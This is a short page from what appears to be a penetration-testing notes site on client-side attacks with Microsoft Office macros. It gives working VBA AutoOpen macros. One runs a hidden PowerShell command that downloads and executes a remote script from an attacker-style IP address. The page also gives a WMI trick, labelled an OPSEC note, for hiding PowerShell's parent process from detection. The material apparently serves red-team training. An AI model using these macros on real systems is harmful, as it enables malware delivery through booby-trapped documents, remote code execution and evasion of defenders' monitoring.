---
title: Microsoft Office Macros
category: Client Side Attacks
order: 2
---

# Visual Basic for Applications (VBA) Macro

VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc. 

VBA is not all that different from VBScript, so it's not too difficult to use the `wscript.shell object`.


> **Note**: The file must be saved in `.doc` format due inside `.docx` files cannot save macros.

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

![Macro](/hackingnotes/images/macro-calc.png)

> **Note**: To force the macro to trigger automatically when the document is opened, use the name`AutoOpen()`.

## Executing a Powershell Payload

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  shell.run "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/a'))"""

End Sub
```

# Changing Prent-Child Relationship

When a powershell is executed from a word macro a child `powershell.exe` process is created from `winword.exe` (MS Word as a Parent). This isn't normal behaviour and highly suspicious.

With `wmi` we can create another parent process and append the powershell to wmi and not to the MS Word.


```VB
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell"
```


> **OPSEC Note**: In that case, powershell will be a child of `WmiPrvSE.exe` rather than MS Word.